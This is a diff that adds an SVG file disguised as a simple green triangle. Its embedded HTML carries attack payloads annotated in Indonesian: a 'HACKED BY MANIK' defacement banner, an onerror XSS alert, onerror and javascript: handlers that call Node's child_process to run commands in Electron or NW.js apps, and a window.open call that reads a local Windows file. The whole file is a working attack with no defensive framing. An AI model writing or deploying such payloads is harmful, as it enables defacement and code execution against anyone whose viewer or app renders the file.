@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+
+  <!-- Tampilan segitiga visual (dummy shape) -->
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+
+  <!-- foreignObject untuk menyisipkan HTML + XSS -->
+  <foreignObject width="300" height="200">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <h1>HACKED BY MANIK</h1>
+
+      <!-- XSS alert fallback -->
+      <img src="x" onerror="alert('XSS')" />
+
+      <!-- Remote Code Execution (Electron/NW.js) -->
+      <image href="x" onerror="eval('require(`child_process`).exec(`calc`)')" />
+
+      <!-- File read via window.open (hanya jika diizinkan oleh app) -->
+      <img src="x" onerror="window.open('file:///C:/windows/win.ini')" />
+    </body>
+  </foreignObject>
+
+  <!-- iframe JavaScript URI (bisa diaktifkan tergantung contextIntegration) -->
+  <iframe href="javascript:require('child_process').exec('calc')"></iframe>
+
+</svg>
